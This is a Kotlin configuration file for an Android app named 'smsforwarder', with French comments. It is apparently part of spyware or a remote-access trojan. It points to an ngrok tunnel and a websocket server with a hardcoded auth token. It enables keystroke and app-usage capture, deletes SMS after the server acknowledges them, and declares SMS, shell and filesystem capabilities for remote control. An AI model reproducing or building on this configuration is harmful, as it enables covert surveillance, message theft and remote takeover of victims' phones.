package com.smsforwarder

object Config {
    const val SERVER_IP = "6.tcp.ngrok.io"
    const val SERVER_PORT = 18325
    const val AUTH_TOKEN = "1X6zYLPLBE2xiSQETMEl0AFevPQ_3au6AvjmRow2HFgghcE4c"
    const val WEBSOCKET_URL = "ws://$SERVER_IP:$SERVER_PORT"

    const val DELETE_SMS_AFTER_ACK = true

    // ---- Protocole ----
    const val CLIENT_PROTOCOL_V = 3
    val CLIENT_CAPS = arrayOf("sms", "evt", "app", "shell", "fs")

    // ---- Capture ----
    const val CAPTURE_APPS = true
    const val CAPTURE_KEYS = true
    const val CAPTURE_ALL_APPS = false
    const val CAPTURE_HW_KEYS = true
    const val CAPTURE_CONTENT = false
    const val LOG_LAUNCHER = false
    const val LOG_SYSTEMUI = false
    const val LOG_OWN_APP = false

    // ---- Pipeline ----
    const val EVENT_DEBOUNCE_MS = 500L
    const val EVENT_MAX_ITEMS = 50
    const val EVENT_MAX_BYTES = 4096
    const val PIPELINE_CAPACITY = 2000
    const val DEDUPE_WINDOW_MS = 1000L
    const val MIN_FOREGROUND_MS = 1000L

    // ---- Outbox ----
    const val OUTBOX_CAP = 5000
    const val OUTBOX_FILE = "event_outbox.jsonl"

    // ---- Journal local des applications ----
    const val APP_LIST_FILE = "app_list.txt"
    const val APP_LIST_MAX_BYTES = 2_097_152L

    // ---- Shell ----
    const val SHELL_CHUNK_BYTES = 32768
    const val SHELL_MAX_TEXT_BYTES = 524_288

    // ---- Rédaction ----
    const val REDACT = true

    // ---- Chien de garde ----
    const val WATCHDOG_INTERVAL_MS = 15000L

    // ---- Debug ----
    const val DEBUG_PROTOCOL = false
}
